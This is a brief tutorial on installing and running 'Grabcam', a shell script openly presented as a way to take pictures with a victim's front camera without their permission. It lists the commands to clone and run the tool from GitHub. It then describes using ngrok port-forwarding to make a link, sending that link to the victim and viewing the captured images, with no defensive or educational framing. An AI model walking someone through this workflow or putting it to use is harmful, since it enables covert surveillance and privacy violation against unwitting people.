Grabcam

×

Grabcam is a shell script which can be used to access victim front camera and click a picture without their permission.
[NOTE -:- This will not work for Android 7 or above]


$ apt-get install && apt-get upgrade

This will upgrade the repositories, it is important because sometimes we face errors if the repository are not updated.

$ pip install lolcat

This command will install pacakage lolcat.

$ git clone https://github.com/noob-hackers/grabcam

This will clone [Download] the tool on your device for further use.

$ cd grabcam

Enters into the grabcam directory.

$ bash grabcam.sh

Execute the tool [files ending with .sh extension are been executed by 'bash {file name}' or './{file name}'.

=> Turning on Hotspot

We are going to use ngrok for port-forwarding and in mobile-device ngrok creates link when hotspot is turned-on and keep the hotspot on until the whole process.

=> Choose option '2' for port-fowarding from ngrok.

=> Send link to victim

=> To see captured images
